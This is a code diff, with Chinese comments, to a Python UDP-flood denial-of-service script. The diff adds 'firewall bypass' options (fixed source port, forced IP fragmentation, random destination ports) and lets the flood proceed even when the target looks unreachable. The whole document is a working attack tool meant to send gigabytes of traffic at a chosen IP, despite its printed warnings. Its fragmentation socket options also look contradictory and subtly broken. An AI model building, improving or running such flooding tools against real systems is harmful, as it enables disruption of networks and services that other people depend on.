@@ -3,6 +3,7 @@ import os
 import time
 import socket
 import ipaddress
+import random
 
 # ==================== 启动艺术字与法律警告 ====================
 
@@ -77,12 +78,34 @@ try:
 except ValueError:
     rate_limit = 0.0
 
-PACKET_SIZE = 1490
+# ---------- 防火墙绕过选项 ----------
+print("\n--- 防火墙绕过选项 (仅供实验) ---")
+src = input("指定源端口 (留空则系统随机分配): ").strip()
+source_port = int(src) if src else None
+
+frag = input("启用 IP 分片? (y/N): ").strip().lower()
+use_fragmentation = (frag == 'y')
+
+rnd = input("使用随机目标端口? (y/N): ").strip().lower()
+random_target_port = (rnd == 'y')
+
+# 根据分片设置载荷大小
+if use_fragmentation:
+    PACKET_SIZE = 3000   # 大于常见 MTU，强制分片
+else:
+    PACKET_SIZE = 1490
+
 total_bytes = int(total_gb * 1024 * 1024 * 1024)
 max_packets = total_bytes // PACKET_SIZE
 print(f"\n[*] 将发送 {max_packets} 个数据包，总计 {total_gb:.2f} GB。")
 if rate_limit > 0:
     print(f"[*] 发包间隔: {rate_limit} 秒")
+if source_port is not None:
+    print(f"[*] 源端口: {source_port}")
+if use_fragmentation:
+    print(f"[*] IP 分片已启用，单包载荷 {PACKET_SIZE} 字节")
+if random_target_port:
+    print("[*] 随机目标端口模式已启用")
 
 # ==================== 目标可达性检查 ====================
 
@@ -99,8 +122,10 @@ def check_target(ip, port):
 
 print("[*] 正在检查目标连通性...")
 if not check_target(target_ip, target_port):
-    print("DDOS-Attack------ERROR")
-    sys.exit(1)
+    print("[!] 目标似乎不可达或 TCP 端口未开放。")
+    choice = input("是否仍要尝试发送？(y/n): ").strip().lower()
+    if choice != 'y':
+        sys.exit(1)
 
 # 最终确认
 print("\n[!] 最后警告：你即将向目标发送大量 UDP 流量。")
@@ -112,6 +137,21 @@ if confirm != 'yes':
 # ==================== 攻击发送循环 ====================
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# 源端口绑定
+if source_port is not None:
+    try:
+        sock.bind(('', source_port))
+    except OSError as e:
+        print(f"[!] 无法绑定源端口 {source_port}: {e}")
+        sock.close()
+        sys.exit(1)
+
+# IP 分片设置
+if use_fragmentation:
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
+
 payload = os.urandom(PACKET_SIZE)
 
 sent = 0
@@ -121,14 +161,21 @@ start_time = time.time()
 
 try:
     while sent < max_packets:
-        sock.sendto(payload, (target_ip, target_port))
+        # 确定当前目标端口
+        if random_target_port:
+            current_port = random.randint(1, 65535)
+        else:
+            current_port = target_port
+
+        sock.sendto(payload, (target_ip, current_port))
         sent += 1
         sent_bytes += PACKET_SIZE
 
-        # 端口递增（模拟真实攻击行为）
-        target_port += 1
-        if target_port > 65534:
-            target_port = 1
+        # 如果不使用随机端口，才进行端口递增
+        if not random_target_port:
+            target_port += 1
+            if target_port > 65534:
+                target_port = 1
 
         # 每 1 MB 输出一次进度
         if sent_bytes >= next_mb_threshold:
